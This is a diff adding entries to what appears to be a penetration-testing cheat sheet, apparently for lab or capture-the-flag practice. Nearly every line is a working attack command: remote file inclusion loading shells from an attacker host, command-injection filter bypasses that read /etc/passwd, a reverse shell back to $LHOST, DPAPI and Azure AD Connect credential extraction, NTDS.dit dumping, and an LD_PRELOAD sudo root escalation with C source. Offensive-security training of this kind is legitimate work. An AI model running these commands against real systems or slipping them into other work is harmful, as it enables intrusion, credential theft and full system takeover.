@@ -119,6 +119,11 @@ wpscan --url http://$IP -U <user> -P /usr/share/wordlists/rockyou.txt   # login 
 # Jenkins /script (Groovy):  println 'id'.execute().text
 # Redis unauth -> SSH key:  config set dir /var/lib/redis/.ssh ; config set dbfilename authorized_keys ; set x '<pubkey>' ; save
 # Ghostcat (AJP 8009, CVE-2020-1938):  python3 ajpShooter.py http://$IP:8080 8009 /WEB-INF/web.xml read
+# RFI - include takes a URL:  ?page=http://$LHOST/shell.txt
+#   Windows + allow_url_include=Off? UNC still works:  ?page=\\$LHOST\share\shell.php
+#   impacket-smbserver share $(pwd) -smb2support     (use real samba if smbserver drops the connection)
+# cmdi filter bypass: cat${IFS}/etc/passwd | {cat,/etc/passwd} | c\at /etc/pa*wd | echo Y2F0|base64 -d|sh
+# PHP type juggling: password[]=x (array -> NULL == 0) | 0e magic hashes compare equal ('0e12' == '0e99')
 
 # Tomcat Manager -> WAR shell (defaults: tomcat:tomcat / tomcat:s3cret / admin:admin)
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war -o rev.war
@@ -199,6 +204,12 @@ nxc ldap $IP -u <user> -p <pass> --gmsa        # gMSA managed password (or gMSAD
 #   diskshadow (expose C: as Z:) ; robocopy /b Z:\Windows\NTDS . ntds.dit ; reg save hklm\system system
 #   secretsdump.py -ntds ntds.dit -system system LOCAL
 runas /user:<dom>\administrator /savecred "cmd /c whoami"   # re-use a cmdkey-stored cred
+RunasCs.exe <user> <pass> "cmd /c whoami" -r $LHOST:$LPORT  # run as a user with no WinRM/RDP, from a shell
+# DPAPI -> plaintext (saved RDP/network/browser creds), not a hash:
+#   blobs in %APPDATA%\Microsoft\Credentials\ ; masterkey in ..\Protect\<SID>\
+#   mimikatz: dpapi::masterkey /in:<mk> /sid:<SID> /password:<pw>  then  dpapi::cred /in:<blob>
+#   or: impacket-dpapi credential -file <blob> -key <masterkey>
+# Azure AD Connect box? ADSync DB holds a DA password it can decrypt (azuread_decrypt_msol.ps1)
 dir /R                                          # NTFS alternate data streams (Get-Content f -Stream x)
 # forced auth from a writable share - Explorer fetches the icon, leaking NetNTLMv2 to Responder
 printf '[Shell]\nCommand=2\nIconFile=\\\\%s\\share\\x.ico\n[Taskbar]\nCommand=ToggleDesktop\n' "$LHOST" > @pwn.scf
@@ -209,6 +220,8 @@ sudo nc -lvnp 389
 
 
 ```bash
+nxc smb $IP -u '' -p '' --rid-brute 10000     # real user list from a null/guest session
+impacket-lookupsid <domain>/guest@$IP 10000   # same idea, via SID walking
 kerbrute userenum -d <domain> --dc $IP users.txt
 impacket-GetNPUsers <domain>/ -no-pass -usersfile users.txt -dc-ip $IP        # AS-REP roast
 impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip $IP -request               # Kerberoast
@@ -295,6 +308,9 @@ showmount -e $IP                               # look for (rw,no_root_squash); c
 sudo mount -t nfs $IP:/export /mnt -o nolock && sudo cp /bin/bash /mnt/rootbash && sudo chmod +s /mnt/rootbash
 #   then on target:  /export/rootbash -p
 id                                             # disk -> debugfs /dev/sda1 (read/write any file) | adm -> /var/log | shadow
+# sudo -l shows env_keep+=LD_PRELOAD -> root with ANY allowed binary, no GTFOBins entry needed
+#   gcc -fPIC -shared -nostartfiles -o /tmp/x.so x.c   (x.c: void _init(){setuid(0);system("/bin/bash");})
+#   sudo LD_PRELOAD=/tmp/x.so <any-allowed-binary>
 # python import hijack: root script does 'import config' and its dir is writable -> drop config.py
 
 # Windows
@@ -347,6 +363,14 @@ kubectl auth can-i --list            # create pods -> schedule a privileged host
 hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 # common modes: 0 md5, 1000 ntlm, 1800 sha512crypt, 13100 kerberoast TGS
+# creds hide in file formats, not just hashes - read the artefact before cracking anything
+vncpwd ~/.vnc/passwd                          # VNC: published DES key -> plaintext, no cracking
+kpcli --kdb db.kdbx                           # KeePass, once you have the master password
+mdb-tables b.mdb && mdb-export b.mdb users    # MS Access (mdbtools)
+readpst -o out mail.pst                       # Outlook -> mbox (pst-utils)
+sqlite3 app.db .dump                          # any dropped .db
+# and triage every file a box hands you
+exiftool f.jpg ; binwalk -e f.png ; strings -n 8 f.bin ; steghide extract -sf f.jpg
 ciscot7.py -d -p <type7>                       # Cisco type 7 is reversible; type 5 = md5crypt (john)
 hashcat --example-hashes | grep -i <type>      # find the right mode
 ```
